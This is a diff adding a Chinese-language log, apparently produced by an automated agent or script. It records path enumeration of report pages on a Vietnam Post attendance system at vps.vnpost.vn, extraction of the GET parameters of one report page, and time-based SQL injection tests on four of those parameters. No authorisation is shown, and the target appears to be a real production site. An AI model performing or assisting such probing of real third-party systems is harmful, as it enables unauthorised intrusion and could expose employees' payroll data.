@@ -1,0 +1,88 @@
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔴 补救：全面枚举report目录（我之前漏掉的）
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[1] 枚举所有report页面
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  测试: /chamcong/report/rpt_BCC.aspx
+    ⚠️  302 (大小: 146)
+
+  测试: /chamcong/report/inBCC.aspx
+    ⚠️  302 (大小: 146)
+
+  测试: /chamcong/report/report.aspx
+
+  测试: /chamcong/report/report_BCC.aspx
+
+  测试: /chamcong/report/rpt_report.aspx
+
+  测试: /chamcong/report/view_report.aspx
+
+  测试: /chamcong/report/print_report.aspx
+
+  测试: /chamcong/report/export_report.aspx
+
+  测试: /chamcong/report/rpt_chamcong.aspx
+
+  测试: /chamcong/report/rpt_BC01.aspx
+
+  测试: /chamcong/report/rpt_BC02.aspx
+
+  测试: /chamcong/report/rpt_BC03.aspx
+
+  测试: /chamcong/report/rpt_MAU1.aspx
+
+  测试: /chamcong/report/rpt_MAU2.aspx
+
+  测试: /chamcong/report/rpt_detail.aspx
+
+  测试: /chamcong/report/rpt_summary.aspx
+
+[2] 访问rpt_BCC.aspx（用户发现的页面）
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  URL: http://vps.vnpost.vn/chamcong/report/rpt_BCC.aspx?kyluong=112025&MA_DV=KVMB&TEN_DV=Kho&MA_BP=TC&TEN_BP=BC&MA_TO=VP&TEN_TO=Van
+
+  响应大小: 146 bytes
+
+  提取所有参数:
+    GET参数:
+      - kyluong
+      - MA_DV
+      - TEN_DV
+      - MA_BP
+      - TEN_BP
+      - MA_TO
+      - TEN_TO
+
+  查看页面内容:
+<html><head><title>Object moved</title></head><body>
+<h2>Object moved to <a href="/chamcong/SessionTimeout.html">here</a>.</h2>
+</body></html>
+
+[3] 快速测试SQL注入（所有GET参数）
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  测试参数: kyluong
+    基线: 495ms
+    测试: 4ms
+    差异: -491ms
+
+  测试参数: MA_DV
+    基线: 490ms
+    测试: 4ms
+    差异: -486ms
+
+  测试参数: MA_BP
+    基线: 491ms
+    测试: 5ms
+    差异: -486ms
+
+  测试参数: MA_TO
+    基线: 507ms
+    测试: 4ms
+    差异: -503ms
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✅ 补救完成
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
